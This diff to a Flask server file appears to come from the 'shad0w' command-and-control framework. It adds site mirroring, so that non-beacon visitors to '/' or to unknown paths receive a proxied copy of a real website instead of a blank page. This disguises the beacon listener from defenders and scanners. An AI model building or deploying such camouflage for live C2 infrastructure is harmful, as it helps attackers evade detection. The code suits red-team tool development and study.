@@ -1,10 +1,12 @@
 import sys
 import logging
+import mimetypes
 
+from lib import mirror
 from .path_handler import Handler
 
 from OpenSSL import SSL
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, Response
 
 app = Flask(__name__)
 
@@ -27,11 +29,15 @@ def log_request():
 
 @app.route("/")
 def web_blank_page():
-    # this page should never be hit by a legit beacon
-    # so if its hit dont do anything
+    # this page should never be hit by a legit beacon, so if it is then its not a beacon.
+    # either return a blank page or a mirrored page depending on what the user has set.
     shad0w.debug.log("HTTP - '/' was hit")
 
-    return phandle.blank_page()
+    if shad0w.mirror is None:
+        return phandle.blank_page()
+    
+    elif shad0w.mirror is not None:
+        return shad0w.page_data
 
 @app.route("/register", methods=["GET", "POST"])
 def web_register_beacon():
@@ -54,6 +60,15 @@ def web_stage_beacon():
 
     return phandle.stage_beacon(request)
 
+@app.errorhandler(404) 
+def not_found(e):
+    path = shad0w.mirror + request.path
+    shad0w.debug.log(f"proxying call to {path}")
+    
+    data, headers, status_code = mirror.mirror_site(shad0w, path, dynamic=True, method=request.method, headers=request.headers,
+                                                    data=request.get_data(), cookies=request.cookies)
+
+    return Response(data, status_code, headers)
 
 def run_serv(*args):
     # cant think of a better way doing this so guess i gotta use globals
